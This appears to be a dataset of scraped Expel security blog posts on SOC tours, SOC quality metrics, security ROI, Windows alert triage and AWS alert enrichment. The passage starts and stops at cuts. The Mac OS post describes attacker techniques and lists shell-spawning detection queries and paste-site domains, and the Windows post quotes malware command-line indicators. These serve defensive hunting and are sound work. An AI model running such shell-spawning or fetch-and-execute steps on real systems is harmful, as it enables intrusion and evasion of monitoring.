!'}) (input_keys={'title'}),
  Example({'title': 'How to make the most of your virtual SOC tour', 'url': 'https://expel.com/blog/how-to-make-the-most-of-your-virtual-soc-tour/', 'date': 'Apr 20, 2021', 'contents': 'Subscribe  EXPEL BLOG How to make the most of your virtual SOC tour Security operations  3 MIN READ  TYLER FORNES  APR 20, 2021  TAGS: Guide / SOC Since 2020 and 2021 are apparently The Year (Years?) of Zoom, were scrapping the in-person things that once felt like must-dos, like booking a plane ticket to meet face-to-face with that new vendor youre evaluating. In pre-pandemic days, we invited prospects to physically come and visit our headquarters and Security Operations Center (SOC). They got to tour our SOC, meet the team, chat with our execs and get a feel as to whether Expel was the right security partner for their org. In fact, we used to even give prospects a pre-read before coming to see us in Herndon. It wasnt the usual marketing fluff youd expect to receive; instead, it was a laundry list of recommendations for how to pressure test a potential security provider during the visit. Thanks to our new Zoom-first environment, we decided to create a new, completely virtual way to give prospects a strong sense of what working with Expel would really be like. Enter Expels Virtual SOC tour. Whats a virtual SOC tour? Our virtual SOC tour is exactly what it sounds like  weve tried to recreate that former in-person experience to give our prospects a solid look at who we are and how we can support them. This behind-the-scenes look gives you a chance to: Meet our experts, including our CEO and at least one of our lead SOC analysts Get an understanding of what transparency means to Expel Learn what to expect as an Expel customer and how wed work with your team Ask all your burning questions How to prepare for your virtual SOC tour While theres nothing you have to do to prepare  the process is truly as simple as signing up and showing up from behind your computer screen  we like to share a few tips thatll help you get the most out of a virtual SOC tour. We think these are useful things to do whether youre meeting with us or another vendor. First, preparation is key. Go into the conversation knowing when you want to buy, what you want to pay and which SOC features are must-haves for you and your team (247 monitoring? Phishing support? Something else?). In addition to preparing and knowing what you want out of the meeting, come ready with a list of questions thatll help you truly get an understanding for how the vendor operates. Here are the things we think you should ask about as youre touring with a potential new security partner. 5 questions to ask during your virtual SOC tour #1: Can I talk to a handful of your customers? Youll get a higher fidelity picture of customer life by talking to customers. (Shocking, right?) During a SOC tour, youll likely be shown what the provider wants you to see by default. What we at Expel want you to see may be different than our competitors, but it will still be what we want you to see. Dont let a potential provider get away with that. If possible, line up the customer chats before (or shortly after) the virtual SOC tour. #2: In the past 12 months, what third-party integrations have you done? Which features did you release and why? A vendors plans for the future are well and good  and necessary. However, consider asking about what theyve built in the past. You know how you ask about work history when youre hiring someone? The same thing applies here, as past behavior is a great predictor of future action. Can the vendor answer questions about what theyve built so far? Can they tell you why they made the decisions they did? This will tell you a lot in a short time. #3: How will you help take [annoying thing your team doesnt enjoy] off my plate? Be selfish. There are other things you want to get done besides the mundane day-to-day of security operations. What are the tasks you dont want to have to worry about? What would make you and your security team happy? (Yes, you can say security and happy in the same sentence.) #4: Can I see some deliverables? Youll definitely want to see some deliverables. These obviously have to be scrubbed, so asking in advance is important. In addition to asking for deliverables, ask to see what it looks like when something goes wrong. What does that communication loop look like? Because something will go wrong. Anyone who says otherwise is lying. #5: Can I set up some additional time to meet 1:1 with a shift analyst? Time to ask for something off script. During the virtual SOC tour, ask if you can spend a bit of time with a shift analyst  someone on the pointy end of the spear whose responsibility is providing service. If your request is met with anything but a resounding yes, thats a warning sign. When you talk to the analyst, have a conversation to find out what its really like to work at the provider. Do you leave the chat wanting to hire them? Thats telling. Make your potential provider uncomfortable Visiting your current  or would be  managed security provider can be a telling experience. Its the best way to separate fact from fiction and see what youre buying first hand. In addition to the mechanical requirements  like seeing the SOC, getting the security program presentation and peeking at the roadmap  think about evaluating the truth in between the lines. Want to join one of Expels virtual SOC tours? Send us a note .'}) (input_keys={'title'}),
  Example({'title': 'How to make your org more resilient to common Mac OS ...', 'url': 'https://expel.com/blog/how-to-make-org-more-resilient-common-mac-os-attacks/', 'date': 'Jul 23, 2019', 'contents': 'Subscribe  EXPEL BLOG How to make your org more resilient to common Mac OS attacks Security operations  6 MIN READ  ANDREW PRITCHETT  JUL 23, 2019  TAGS: EDR / Get technical / How to / Hunting / Vulnerability I remember when I got my first MacBook. My first malware-less computer , I thought to myself. Fast forward a few years to when I started working in the information security world and my feelings of invincibility depreciated pretty rapidly. Although Mac OS attacks occur less often than Windows OS attacks, the implications of an attack happening on either OS can be lethal. If you work in cybersecurity, you know that attack trends are a thing. Theres always some new hotness in attacker Tactics, Techniques, and Procedures (TTPs), which often parallels the TTPs of security red teamers. Why? Well, when you see something that works, why reinvent the wheel? At Expel, were seeing more and more orgs utilizing Mac OS, yet theres still little discussion about practical enterprise security for Mac OS. But because plenty of our customers run Mac OS systems, were calling attention to a few recent attack trends were seeing and how you can make your org (and devices) more resilient. Recent Mac OS activity and detections There are two TTPs Ive seen recently that target Mac OS. The first involves the use of persistent interactive scripting interpreters to evade command line auditing. The second involves the use of launchd persistence to download encoded text and compile the encoded text into binary in order to evade perimeter content-based filtering and host-based AV. Using encoded commands from PowerShell is an effective technique thats been used by Windows attackers for a long time  Macs are no longer immune. Technique 1: Execution of persistent interactive scripting interpreters: What is it? Like PowerShell and CMD with Windows, whats a Mac without Bash and Python? Plenty of people love Python because you can use it as both a scripting interpreter and an interactive console. The only downside? Some of the features we love about Python also make it a security threat. For instance, I love how I can quickly write a Python script to conduct common Bash-like functions like making new files and directories. However, if you want to use the Bash syntax we all know and love, you can invoke Bash directly from Python and execute a command within an interactive Bash console. Using Bash, the ability to execute commands are nearly limitless on a Mac. Immediately following successful lateral movement to a Mac OS host, Ive seen attackers use /bin/bash to execute /usr/bin/nohup with parameters for an interactive Python console. If youre not familiar with the native BSD utility, the nohup utility invokes another utility  in this case its Python  with its arguments and tells your system to ignore the SIGHUP signal. This is a problem because nohup allows the utility to remain active and hidden in the background even after a user signs out. Using Python, attackers then execute another interactive Bash terminal. He or she uses that interactive Bash terminal to execute Curl  which lets him or her download malicious shellcode from an online code repository like GitHub or Paste Code. Once the attacker gets his or her hands on the data theyre looking for, that data is then executed locally. The acquired data is either exploit payloads like keyloggers and Keychain dumpers, or utilities to further the attackers mission like media streamers for data exfiltration. The process looks something like this: Though this technique doesnt make it impossible to detect malicious activity, it definitely helps obscure the attackers activity. For example: 1. Following the compromise of a user account with sudo permissions, an attacker executes a Python console which spawns another Bash under root context. 2. The attacker uses a utility such as Curl to download raw text, using it as shell code or converting it to binary. 3. The shell code or binary code is executed under root context. 4. Now the Bash history for the Curl activity mentioned above isnt in the users .bash_history file or /var/root/.sh_history. And its not mentioned in the Mac OS unified logs. So the crafty attacker goes undetected. How do you detect this type of attack? To detect this type of activity on your network, your best bet is to look at your Endpoint Detection and Response (EDR) tech recording process activity from the kernel level. Using your EDR, look for common code syntax to spawn a TTY shell from another shell. Try any of the following queries: python -c import pty; pty.spawn(/bin/sh) python -c import pty; pty.spawn(/bin/bash) bash -i /bin/sh -i perl e exec /bin/sh; ruby: exec /bin/sh You can also look for any of these processes as parent of a TTY shell: vi (or) vim nmap python perl ruby Java The next step in the process is to look for instances where the child process is a parent of curl or wget, and where the process arguments point to an online code repository. Here are some examples of code repository domains that  in this context  should raise a red flag: paste[.]ofcode[.]org pastecode[.]xyz pastiebin[.]com paste[.]org raw[.]githubusercontent[.]com wstools[.]io gist[.]github[.]com pasted[.]co etherpad[.]org Snipplr[.]com By running the activities above using Carbon Black Response (one of the EDR techs that some of our customers use), I produced this recorded process tree: Looking at the curl process arguments resulting from the child bash shell, theres a command line argument noting a download from raw[.]githubusercontent[.]com: How do I protect my org from this kind of attack in the future? 1. Determine if your engineering team has a business and/or production justification for granting any employees access to any of the online code repositories referenced above. If not, black list the domains using your network permeter tech. 2. Use your EDR tech to set up a recurring hunt or custom detection to monitor for the activity discussed above. 3. Consider restricting standard user accounts from using sudo or root, or implement a privilege control service like Make Me Admin or Privileges.app so that user accounts can only be elevated to administrator level on a temporary basis. 4. If you dont have an EDR, go get one. Relying on local host-based detection is risky at best  without an EDR, its easy to miss this type of activity. Technique 2: Launchd persistence to download encoded text What is it? I first saw this technique used by a sophisticated commodity malware masquerading as a legit media update. When an unsuspecting user tries to update the tech, the malware establishes persistence via launchd and creates and executes a randomly named sub-process from /private/tmp. Launchd allows an attacker to continually execute the malicious app every time a user logs on. Even if the user kills and deletes the processes running from /private/tmp the malicious process recreates the /private/tmp process again following a successful logon. The sub-process running from /private/tmp then executes /bin/bash and is followed by a series of strategic bash commands to assemble a malicious binary from raw text. A sub-process uses /bin/bash to pass a block of encoded text in an anonymous pipe which is then decoded by executing /usr/bin/base64. The decoded value is passed back through the anonymous pipe to xxd and formatted into hex. Once in hex, its then reverted from hex to binary. The resulting malicious binary is then executed on the local host while leaving no evidence of a binary download at the perimeter of the network. The process looks like this: How do you detect this type of attack? Just like the first attack I described, your EDR tech is your best friend for detecting this one. However, identifying the specific commands executed by the attacker is a multi-step (aka not quick) process. Why? Because of the way that the kernel assigns the file system value in place of the actual value being passed in the anonymous pipe. The screenshot below shows an actual process tree of an attacker attempting this technique as recorded by Crowdstrike Falcon . The command line for base64 specifies to decode (decode) the encoded value (/dev/fd/63). The encoded value is actually a base64 string, but you cant see the true value the attacker is attempting to decode. This creates an extra step for analysts in the investigation process. How can you discover that an attacker is storing data in an anonymous pipe? Use your EDR tech to look for processes with /dev/fd/63 in command line arguments, especially if the process has the ability to encode, decode, archive or compile binaries. The occurrence of /dev/fd/63 is not that common; however, youll run into false positives. Once you find a couple suspicious processes with /dev/fd/63, make note of the process names, command lines, hosts and users associated with them. Now use your EDR technology to either tail or grep the users Bash history file for the process name and command line which included /dev/fd/63 in its command line arguments. Heres how to do it using Carbon Black Response : 1. Use your EDR tech to get a copy of the users bash history file: 2. Download the Bash history file and use a combination of tail and grep to identify the process  in this case base64  command which generated the recorded activity by your EDR tech: 3. The long base64 string follows the decode argument. You can use any number of tools or utilities, including base64, to safely decode the string and find out what the attacker was trying to do. How do I protect my org from this kind of attack in the future? To make your org more resilient to this type of technique in the future, use your EDR tech to set up a recurring hunt or custom detection to monitor for processes with /dev/fd/63 in command line arguments, especially if the process has the ability to encode, decode, archive or compile binaries. Then follow the suggested triage steps above. Need some help setting up a new hunt? Read our post on getting started with threat hunting . Bonus tip: all of these resilience actions will benefit your companys security posture if youve got Linux hosts in your environment, too. Conclusion Whether its commodity malware or obfuscated command execution on Mac OS that keeps you up at night, there are some easy steps to take for detecting and triaging the problems  and keeping them from happening again. Have questions about detecting attacks on Mac OS, or want to know more about hunting for these types of threats? Send us a note .'}) (input_keys={'title'}),
  Example({'title': 'How to measure SOC quality', 'url': 'https://expel.com/blog/how-to-measure-soc-quality/', 'date': 'Jun 2, 2021', 'contents': 'Subscribe  EXPEL BLOG How to measure SOC quality Security operations  8 MIN READ  MATT PETERS AND JON HENCINSKI  JUN 2, 2021  TAGS: MDR / Metrics / Tech tools Theres a common assumption that there will always be tradeoffs between scale and quality. When we set out to build our security operations center (SOC) here at Expel, we didnt want to trade quality for efficiency  it just didnt feel right. So, when we started the team we pledged that quality and scale would increase together. Our teams response: challenge accepted. That commitment to quality now extends to every aspect of our operations  our customers can see everything we do. So our work has to be fast and its got to be good. In previous posts, weve talked a lot about how weve scaled our SOC with automation . This is something of a sweet spot for us  weve had some pretty good wins and learned a ton about metrics along the way. In this post, were going to walk you through the quality end of the equation  how we measure and manage quality in our SOC. Along the way, well share a bit about the problems weve encountered, how weve thought about them and some of our guiding principles. TL;DR: quality is not based on what you assert, its based on what you accept. Its not enough to say, Were going to do lean six sigma  you have to inspect the work. And its how you inspect the work that matters. A super quick primer on quality If youre new to quality and need a quick primer, read along. For folks who already know the difference between quality assurance and quality control, feel free to jump ahead. There are two key quality activities: quality assurance (QA) which is meant to prevent defects, and quality control (QC) which is used to detect them once theyve happened. In a SOC, QA are the improvements you build into your process. Its anything from a person asking, Hey, can I get a peer review of this report? to an automated check (in our case, our bots) saying, Tuning this alert will drop 250 thousand other alerts, are you sure? You probably have a ton of these checks in your SOC even if you dont call them QA. Theyre likely a build up of fix this, now fix that type lessons learned. QC is a bit different. It measures the output of the process against an ideal. For example, in a lumber yard, newly milled boards are checked for the correct dimensions before theyre loaded onto a truck. Quality control consists of three main components: What youre going to measure How youre going to measure it What youre going to do with the measurements What you measure For a mechanical process  like those newly milled boards  its possible to check every board using some other mechanism. For investigations that require human judgement, we realized that anything more than trivial automated QC quickly became unsustainable  in our SOC we run ~33 investigations a day (based on Change Point analysis), and cant have another analyst check over each one or wed spend most of our time chasing ghosts. (Theres that darn scale and quality tradeoff.) We didnt give up though  we just figured out that we needed to be more clever in how we apply our resources. We decided on two things: We would sample from the various operational outputs (like investigations, incidents and reports). Turns out, theres an industry standard on how to do that! We would ensure the sample was representative of the total population. Following these two guidelines, we use our sample population as a proxy for the larger output population. By measuring the quality in our sample, we can determine if our process is working at a reasonable level. ISO 2859-1  Acceptable Quality Limits (AQL) has entered the chat. TL;DR on ISO 2859-1: You make things AKA your lot. AQL tells you how many items (in our case: alerts/investigations/incidents) you should inspect based on how many you produce to achieve a reasonable measure of overall quality. AQL also tells you how many defects equal a failed quality inspection. If your sample contains more defects than allowed by the AQL limit, you fail. If not, you pass. There are three inspection levels. The better your quality is, the less of your lot you have to inspect. The worse your quality is, well, youre inspecting more. Heres an AQL calculator that Ive found super helpful. Reminder: Quality is not based on what you assert, its based on what you inspect. Lets put this into practice using some made-up numbers with our actual SOC process: On a typical day in our SOC: Well process millions of events using our detection bot weve named Josie . Those millions of events will result in about 500 alerts sent to a SOC analyst for human judgment. About 33 alerts will result in a deeper dive investigation; and Two to three security incidents. The image below gives a high-level visual of how the system works. Youll see that security signals come in, are processed with a detection engine and then a human takes a sample of the data and applies their expertise to determine quality. High level diagram of Expel detection system The chart below shows that we break our SOC output up into three lots. SOC output Work item Daily lot size Alerts ~500 Investigations 30 Incidents 2-3 Recall that with AQL there are three inspection levels (I, II, III). We use General Inspection Level I at Expel. Reminder: this assumes quality is already good and its also the lowest cost. If youre just getting started, its OK to start with Level I. If, after inspecting, you find your quality isnt that great  its time to move up a level. Now, this is the point where you can manually review AQL tables or you can use an online AQL calculator to make things a bit easier. Lets try this with our alert lot. Our lot is about 500 alerts. My General Inspection Level is I, so Im going to set an AQL limit of no more than four defects. AQL indicates we should review 20 alerts to have a sample thats representative of the total population of alerts. If we apply the same methodology across all of our work, heres what our sampling ends up looking like: SOC output aka lot size vs. sample size Work item Daily lot size General Inspection Level Sample size AQL Limit Alerts ~500 I 20 4 Investigations 30 I 5 4 Incidents 2-3 I 3 4 How you measure Once weve arrived at a sample population, we need a way to measure it against whats considered good. As we built our process, we decided to adhere to a mantra: Our measurements must be accurate and precise We need a way to measure accuracy  it has to represent the true difference between an output and the ideal. If youre stuck on this, we found the best thing to do is try to convert whatever we were looking at into a number. For example, if you need your report to have high-quality writing, try a grammar score rather than relying on judgements (the authors use of metaphor was challenging). In addition to being accurate, we need measurements to be precise. In other words, it needs to be reproducible  we work in shifts and if one shift is consistently easier graders, its going to cause a problem. For us, thats where the QC check sheet came in. A QC check sheet is a simple and easy way to summarize things that happened. Think about your cars safety inspection. After the super fun time of waiting in line, the technician walks through a series of specific checks and collects information about defects detected. Wipers? Check! Headlights? Check! Brakes? Doh! If all things check out, you pass inspection. If your brakes dont work (major defect), you fail inspection. Like a car inspection at an auto shop, our team performs an inspection; the inspector will follow a series of defined checks and the outcome of each check will be recorded and scored. If youre wondering what our SOC QC check sheet looks like, you can go and grab a copy at the end of this post. Putting it all together We have our sample size. We have our QC check sheet. But how do we go about randomly selecting our sample? A Jupyter notebook of course! We use the python pandas library to draw samples at random. We collect these samples from work that happened during the day and night hours. We perform quality inspections every day. Lets walk through one: We open our Jupyter quality control notebook and select which days work we want to inspect. We record the inspector, smash the Start Quality Check button and then were off to the races. Expel SOC QC check initialization step Our Jupyter Notebook reads from Expel Workbench APIs to determine how much work we did on May 5, 2021. In the table below you can see we triaged 672 alerts, performed 67 investigations, ran down one security incident and moved 85 alerts to an open investigation. Expel SOC QC random selection step You may be thinking: but you said you typically handle about 500 alerts per day and 30 investigations. Great catch. Change-Point Analysis is your huckleberry for determining your daily mean. (More details on Change-Point Analysis here .) Then our Jupyter notebook will break our work out into three lots as seen in the image below. Selecting the button within each section will pull in the random sample size based on an AQL check sheet specific to each lot. Expel SOC QC notebook lots On May 5, 2021, we handled one security incident. Lets walk through our inspection. Going back to the image above, if we select the Review incidents button, our notebook will show the sample and the QC check sheet specific to that class of work. In this case, were looking at incidents. Expel SOC QC incident check sheet Our QC check sheet is focused on making sure were following the right investigative process. Did we take the right action? Did we populate the right remediation actions? Did we zig when we should have zagged? When a defect is found, we remediate the issue, record it and then trend defects by work type. If we exceed a certain number of defects for that day, we fail based on AQL. What youre going to do with the measurements If we imagine this QC thing as a cycle, what were trying to do is (a) measure the quality, (b) learn from the measurements and (c) improve quality. In order to do this, we decided we needed our quality metrics and process to have three attributes: The metrics we produce are digestible Our quality checks are performed daily, for every shift What we uncover will be reviewed and folded into improvements in the system So, from the process above, we can roll up our pass/fail rate as the one digestible metric, which allows us to see where were struggling: Expel SOC quality pass / fail rate since March 2020 We then deploy technology, training and mentoring to make sure the quality and scale improve over time. In fact, our SOC quality program is a key driver in a number of recent initiatives including: Automated orchestration of Amazon Web Services (AWS) Expel alerts. We detected variance with respect to how each analyst investigated AWS activity, so we automated it. Automated commodity malware and BEC reporting. Typed input is prime for defects. As you can imagine, we detected a good number of defects in the findings reports for our top two incident classes, so we automated them. Scale and quality both went up! Recap and final thoughts Heres a super quick recap on what we just walked through: Use ISO 2859-1 (AQL) to determine sample size. Jupyter notebooks help you perform random selection. Inspect each random sample using a check sheet to spot defects. Count and trend the defects to produce digestible metrics to improve quality. Run the QC process every 24 hours. Steal this mental model: Expel SOC QC mental model And remember: you dont have to trade quality for efficiency. We hope this post was helpful. We wrote this post because this is something that would have really helped us when we started down the path of measuring SOC quality. Wed love to hear about your quality program. What works? What didnt? Success stories? Were always on the lookout for ways to improve. Download Expels SOC QC checklist'}) (input_keys={'title'}),
  Example({'title': 'How to quantify security ROI... for real', 'url': 'https://expel.com/blog/how-to-quantify-security-roi-for-real/', 'date': 'May 10, 2022', 'contents': 'Subscribe  EXPEL BLOG How to quantify security ROI for real Expel insider  2 MIN READ  GREG NOTCH  MAY 10, 2022  TAGS: Company news / MDR When it comes to security, pressure from the board comes from all sides. They are increasingly concerned that cybersecurity is in proper focus. Are we secure now? Will we be later? Are we making the right investments to address our cybersecurity risk? And the big one: whats all this costing now and in the future? The fact is, you need to spend money to help secure your org. But spending creates additional questions. One of the biggest: how can you be at least reasonably sure the investment will pay off and isnt a complete waste of time, effort, and money? The usual way of calculating cybersecurity return on investment (ROI)? You take the average cost of an incident and multiply that by how many incidents you are likely to have in a given timeframe. So if youve got rough costs for a new technology, you can assess whether the price of it and the reduction in incidents it brings is worth the investment. To us, this sounds like a not enough data guess. Why? There are many more factors that come into play  starting with how to measure how much a technology actually reduces the organizations risk  which makes calculating cybersecurity ROI like nailing Jello to a tree. Some things to think about: What tech do you already have that needs to communicate with the new one? How big of a lift is it to make that happen? Are you shelving a legacy product or disentangling yourself from a current tech relationship and starting a new one? Whats the lift there? Your equation also must include issues at stake beyond just money, including the potential loss of intellectual property, loss of reputation, and the disruptions to your business. You know that breaches are expensive. Its time to guess better. Think about calculating cybersecurity ROI as the start of a conversation about whether investing upfront to help prevent a big disruption outweighs the small probability of a significant breach and its ensuing costs. Arming yourself with as much data as possible (technology research) is the best way to start. Expel has a few resources, including the recently commissioned Forrester Total Economic Impact (TEI) of Expel . This study was conducted by Forrester Consulting, a third-party research group, on behalf of Expel to help potential buyers calculate Expels financial impact on their orgs. Through an extensive customer interview process, Forrester found that Expel customers could get a 610% return on investment (ROI)  helping them lower costs significantly and providing qualitative benefits like greater efficiency and better quality of life. Wait  our customers cost savings are excellent and we provide other meaningful benefits  like giving them peace of mind? To say were ecstatic to see a measurable impact on our customers lives is an understatement. But what about ROI specifically for your org? Fair question. Weve got just the tool. Were excited to introduce our interactive ROI calculator , which gives you an estimate on your ROI if you were to choose Expel as your managed security provider. Bonus, you dont have to talk to a human first. (Although the humans here at Expel are always happy to chat .)'}) (input_keys={'title'}),
  Example({'title': 'How to triage Windows endpoints by asking the right ...', 'url': 'https://expel.com/blog/triage-windows-endpoints-asking-right-questions/', 'date': 'Aug 24, 2017', 'contents': 'Subscribe  EXPEL BLOG How to triage Windows endpoints by asking the right questions Tips  7 MIN READ  GRANT OVIATT  AUG 24, 2017  TAGS: Get technical / How to Mindset over matter. As security practitioners, its important to remember that alerts are only the beginning, not the end, of finding evil. Alerts are simply investigative leads, not security answers. To determine if they have merit, you have to interrogate them. But without a strong process, the wealth of forensic information on the endpoint can easily overwhelm an investigator or lead them astray. In this blog post, Ill explain the three parts of this investigative mindset and show you how to apply them when you triage endpoint alerts. 1. Know your indicators The first question you should ask is a little obvious but its often overlooked: what triggered the alert? As an investigator, if you cant answer that, youre going in with your eyes closed and you run the risk (or rather likelihood) that youre not going to select the right forensic artifacts. Even worse, theres a good chance youll draw the wrong conclusions from the artifacts you do select. One way to get the investigation off on the right foot is to create playbooks that recommend what the initial investigative step is to validate each type of detection.They should contain any IOCs (indicators of compromise) that are a part of the detection along with references to their source (whitepapers, tweets, etc.) or other related alerts. This gives analysts quick context to research the detections they encounter. Dont have a threat intel team? Or maybe your security products dont give you any explanation when they throw an alert at you. Thats OK. Theres plenty of open source intelligence out there. Often a quick Google search or VirusTotal lookup for interesting file names, registry keys, or hashes can provide some context to guide your next steps. But remember, context does not equal conclusions. Intelligence should only be used to guide your line of questioning. Be wary of making conclusions based solely on your search results. 2. Ask the right questions I often find that inexperienced analysts pull back the same sources of evidence, regardless of their investigative lead. Usually, its because theres no process to guide the way they triage an alert and ensure they get a complete picture. Are you sans process? If so, Ive summarized the process I use below by distilling it down into a few questions investigators can use to triage an alert, along with evidence sources that can help answer each question. Keep in mind, though, that the list of forensic evidence is in no way comprehensive. Q: How did it get here? Determine what took place that allowed initial access to the system (but note its not always possible to answer this). Evidence sources: Web browsing history/downloads IIS logs Service Control Manager Event Logs (EID 7045  Service Install) Windows Security Logs (EID 4648  Explicit logon attempt) USB Artifacts (USBSTOR, MountPoints2, MountedDevices registry keys or setupapi.log) Phishing Artifacts ( RecentDocs and TrustedRecords registry keys and Jumplists ) Q: What does it do? Figure out what the malwares host and network capabilities are including how it maintains persistence. This usually involves recovering a sample, performing some static/dynamic analysis, and/or uploading a sample to a sandbox. Evidence sources: File acquisition Directory listings Acquire AV logs Acquire process memory Active network connections (netstat) Registry AutoRuns PowerShell Operational logs Q: Did it execute? If youve answered the previous question you know what the malware could do. The goal here is to see if the malware actually executed. This involves looking at execution artifacts for evidence that a particular binary launched, and searching for dropped files, registry keys created, and related evidence that would indicate the malware performed actions successfully on the system. Evidence sources: Windows Prefetch Application Compatibility Cache (Shimcache) Amcache.hve RecentFileCache.bcf Registry AutoRuns WMI RecentlyUsedApps (RUA) Q: Is it active? If you learn that the malware executed, the next step is to determine if the threat is still present and running regularly on the system. Evidence sources: Process listings Active network connections (netstat) DNS Cache Windows Prefetch Answering these four investigative questions should be your objectives when you triage an alert. You may not be able to get good answers for all of them  for example, determining how a piece of malware was created on a host may be impossible if it was created years ago and the forensic evidence is limited. However, youll find that the answers you do get will quickly lead you to conclusions, and the story you can tell will be more comprehensive. 3. Understand your investigative footing Not all alerts are equal. Depending on where the evidence came from  a file, registry key, process event or log  an analyst will have significantly different investigative perspectives. To illustrate, lets use the investigative questions I outlined above to show how your perspective changes with each evidence source, and how it should steer your forensic questioning. Source #1: File Surprisingly, the presence of a file doesnt necessarily provide a strong investigative footing. While a strange binary on a host should certainly raise suspicions, it may not have executed. Before you retrieve artifacts from the host, consult any playbooks or intelligence about the detection itself to answer the question What does it do?. Knowing what files the malware drops and how it maintains persistence will guide the evidence an investigator seeks out to validate the threat. If available in the alert, use the NTFS timestamps for the file to establish a time window of potential activity. Below is a sample file detection using the approach I outlined above. Example from intel sourced from: https://www.us-cert.gov/ncas/alerts/TA17-117A Investigative Lead: FILE DETECTION: REDLEAVES File Name: VeetlePlayer.exe File Path: C:Program FilesWindows MediaVeetlePlayer.exe Created: 1 day ago MD5: 9d0da088d2bb135611b5450554c99672 File Size: 25704 bytes File Description: Veetle TV Player Signed: True Off the bat we dont know much about this, based on the alert alone. An inexperienced analyst might be inclined to simply acquire the file. But in this case, that would lead to unfruitful results. By looking at the intel for the REDLEAVES RAT provided by the US Cert, we see that VeetlePlayer.exe is a legitimate binary that uses search-order hijacking to import a malicious loader DLL. This DLL then loads encoded shellcode contained in a file into memory. If an investigator simply acquired the legitimate executable, investigators would have come to the entirely wrong conclusion. Here is how Id interrogate the evidence in this context: Q: How did it get here? Based on the recent creation time, we may be able to trace the initial compromise vector. Look for any suspicious logon activity prior to Windows service installation for evidence of lateral movement. Also check evidence relating to phishing documents, like RecentDocs registry keys or Jumplists. Q: What does it do? Using our understanding of how REDLEAVES behaves based on our existing intelligence, the next step is to validate that this is REDLEAVES. Id validate the threat by performing a directory listing of C:Program FilesWindows Media and look for the presence of the malicious DLL (unsigned) and the shellcode file. Also, pull a Registry AutoRuns listing to see if the binary has been made persistent. Q: Did it execute? On a workstation, pull Windows Application Compatibility Cache and Prefetch. This will help identify if and when VeetlePlayer.exe has executed on the host. Q: Is it active? Based on the recent creation time, Id expect this backdoor is likely active in memory. To check, Id pull a process listing with network connection and the DNS cache on the host to validate. Source #2: Registry Registry alerts indicate that something has happened. Registry keys dont create themselves. So, if youre looking at an obscure key that a malware family uses, its likely the host was infected at some point. While registry detections answer, Did it execute?, they often leave you with less of a grasp on What does it do? because youre left without binary metadata. Below is an example of how Id apply the investigative mindset to a registry detection. Example from intel sourced from: https://www.us-cert.gov/ncas/alerts/TA14-212A Investigative Lead: REGISTRY DETECTION: BACKOFF Registry Key: HKCUSOFTWAREMicrosoftWindowsCurrentVersionRun Registry Value: Windows NT Service Registry Data: %APPDATA%AdobeFlashPlayermswinhost.exe Last Modified: 30 days ago From the registry detection we know that something executed to create this registry key. Now, we need to figure out if the referenced binary is evil and what it can do. By looking at the information provided by the US Cert, we can see that this detection is intended for PoS malware that creates two output files within the directory %APPDATA%AdobeFlashPlayer. Given this information, heres how I would proceed with my questioning. Q: How did it get here? Evidence for this may be scarce based on the last modified time of the registry key. Id look for Windows logon events around the last modified time of the registry key, specifically relating to Remote Desktop solutions based on the threat briefing. Q: What does it do? To figure this out, Id acquire the referenced binary %APPDATA%AdobeFlashPlayermswinhost.exe to see if its still present on the host along with a directory listing of %APPDATA%AdobeFlashPlayer to validate whether output files have been created on the host. Q: Did it execute? A registry run key has been created, so we know something has executed on the host. Q: Is it active? Id run a process listing with network connections and retrieve the host DNS cache to look for signs of current activity. Based on the last modification of the registry key, understand that this could be a long shot. Source #3: Process Process alerts put investigators on a relatively strong investigative footing. A process event tells you both that a binary has executed and that its active. Plus, you get metadata about the binary. Again, before you retrieve artifacts from the host, make sure to consult any playbooks or intelligence containing information about the detection itself so you can better answer What does it do? and refine your line of forensic questioning. Below is an example of what that would look like. Example can be found at: https://blog.malwarebytes.com/threat-analysis/2016/07/untangling-kovter/ Investigative Lead: PROCESS DETECTION: KOVTER Process Name: powershell.exe Process Arguments: C:WindowsSystem32WindowsPowerShellv1.0powershell.exe iex $env:ksktr Parent Process Name: mshta.exe Process MD5: 097CE5761C89434367598B34FE32893B User: CORPAlice Start Time: 30 minutes ago Open source research tells us that KOVTER is fileless commodity malware that uses environment variables and registry data to store script interpreter commands that contain embedded shellcode. Given this information, heres how I would proceed with my questioning. Q: How did it get here? Pull web history for the user Alice, along with artifacts related to any phishing attempts. Q: What does it do? We have a general understanding of what it might do from the open source intel. So lets pull the registry key, HKLMSystemCurrentControlSetControlSession ManagerEnvironment, containing system environment variables to see where variable ksktr could be storing powershell commands. Also Id look at Registry AutoRuns to validate that persistence is still intact. Q: Did it execute? This ones easy. If its a process event, that means the binary is running in memory so it must have executed. Q: Is it active? This ones also easy. If its a process event, that means the binary is running in memory  so it must be active. Id check network connections for additional evidence.  Remember folks, detection is only half the battle. Good investigators are separated from great ones by the questions they ask. Hopefully this post has encouraged you to think about your own investigative mindset when you approach alerts. The key is to understand that all alerts are not made equal. Each provides unique investigative context. And by consulting intel resources before you extract forensic artifacts youll develop a more efficient line of questioning.'}) (input_keys={'title'}),
  Example({'title': 'how we automated enrichments for AWS alerts', 'url': 'https://expel.com/blog/power-of-orchestration-how-we-automated-enrichments-aws-alerts/', 'date': 'Aug 18, 2020', 'contents': 'Subscribe  EXPEL BLOG The power of orchestration: how we automated enrichments for AWS alerts Engineering  8 MIN READ  BRITTON MANAHAN  AUG 18, 2020  TAGS: Alert / Cloud security / Framework / Get technical / Managed security If youve read a post or two here on our EXE Blog, it shouldnt come as a surprise that were big on automation. Thats because we want to help analysts more efficiently, quickly and accurately determine if an alert requires additional investigation. Automating repetitive tasks not only establishes standards, it also removes the monotony and cognitive load in the decision making process. And we have the data to back that up. (Check out our blog post about how we used automation to improve the median time it takes to investigate and report suspicious login activity by 75 percent.) Understanding why we do it might be easy. But what about how we do it? Lets dive into that. We never automate until we fully understand the manual process. We do that through the Expel Workbench , which records all the activities an analyst undertakes when investigating an alert. We can inspect these activities, looking for common patterns and bring a data-driven focus to our automation. Follow @cyberpug010 In this post, well dig into how we automated enrichments for Amazon Web Services (AWS) alerts. Fun fact: this was the first task I was given when I started working at Expel. (Hey, Im Britton, a senior detection and response analyst here at Expel.) Well explore the logic deployed by our automated IAM AWS enrichments. Also, Ill share our approach to developing AWS enrichments and the implementation of the enrichment workflow process. Youll walk away with some insights into particular AWS intricacies and how you can implement your own AWS enrichments. Automating AWS IAM enrichments When we create these new enrichments, we need to first define the questions that the associated user will need to ask when determining if an AWS alert is worthy of additional investigation. Here are the questions we came up with: If the alert was generated from an assumed role, who assumed it? Did the source user assume any roles around the time of the alert? What AWS services has the user historically interacted with? Has the user performed any 